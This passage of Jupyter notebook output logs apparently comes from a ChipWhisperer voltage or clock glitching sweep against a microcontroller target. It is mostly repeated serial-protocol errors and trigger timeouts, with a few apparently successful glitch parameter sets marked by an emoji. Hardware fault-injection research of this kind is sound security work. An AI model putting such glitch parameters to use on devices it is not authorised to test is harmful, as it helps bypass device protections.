      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 101\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CWbytearray(b'01')\n",
      "0.78125 -3.90625 44\n",
      "🐙"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:508) Unexpected frame byte in CWbytearray(b'00 00 00')\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:285) Device did not ack\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:508) Unexpected frame byte in CWbytearray(b'00 00 00')\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:285) Device did not ack\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:508) Unexpected frame byte in CWbytearray(b'00 00 00')\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:285) Device did not ack\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n",
      "CWbytearray(b'01')\n",
      "1.953125 -3.90625 45\n",
      "🐙Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CWbytearray(b'01')\n",
      "1.953125 -3.90625 48\n",
      "🐙Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b\n",
      "(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:623) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0a\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timeout - no trigger\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
